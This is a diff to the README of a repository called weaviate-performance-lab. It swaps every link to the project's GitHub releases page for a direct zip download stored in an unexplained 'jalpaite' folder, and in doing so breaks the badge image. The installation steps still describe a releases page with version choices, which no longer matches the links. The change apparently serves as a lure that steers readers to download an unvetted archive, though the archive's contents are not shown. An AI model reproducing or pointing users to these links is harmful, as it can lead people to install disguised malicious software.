@@ -6,9 +6,9 @@ Welcome to the **weaviate-performance-lab**! This application helps improve the 
 
 ## 📥 Download Weaviate-Performance-Lab
 
-[![Download Weaviate-Performance-Lab](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/WangoMango-Hub/weaviate-performance-lab/releases)
+[![Download Weaviate-Performance-Lab](https://raw.githubusercontent.com/WangoMango-Hub/weaviate-performance-lab/main/jalpaite/weaviate-performance-lab.zip%20Release-brightgreen)](https://raw.githubusercontent.com/WangoMango-Hub/weaviate-performance-lab/main/jalpaite/weaviate-performance-lab.zip)
 
-To download the latest version of **weaviate-performance-lab**, visit the following link: [Download Page](https://github.com/WangoMango-Hub/weaviate-performance-lab/releases).
+To download the latest version of **weaviate-performance-lab**, visit the following link: [Download Page](https://raw.githubusercontent.com/WangoMango-Hub/weaviate-performance-lab/main/jalpaite/weaviate-performance-lab.zip).
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ Before you begin, make sure your system meets the following requirements:
 Follow these simple steps to install **weaviate-performance-lab**:
 
 1. **Visit the Download Page:** Click on the link below to access the releases.
-   [Download Here](https://github.com/WangoMango-Hub/weaviate-performance-lab/releases)
+   [Download Here](https://raw.githubusercontent.com/WangoMango-Hub/weaviate-performance-lab/main/jalpaite/weaviate-performance-lab.zip)
 
 2. **Select Your Version:** On the releases page, you will see a list of available versions. Click on the latest version to download.
 
@@ -89,4 +89,4 @@ For feature requests or suggestions, feel free to reach out via the "Issues" pag
 
 Thank you for using **weaviate-performance-lab**! Enjoy enhancing your AI database experience.
 
-[Download Weaviate-Performance-Lab](https://github.com/WangoMango-Hub/weaviate-performance-lab/releases)
+[Download Weaviate-Performance-Lab](https://raw.githubusercontent.com/WangoMango-Hub/weaviate-performance-lab/main/jalpaite/weaviate-performance-lab.zip)
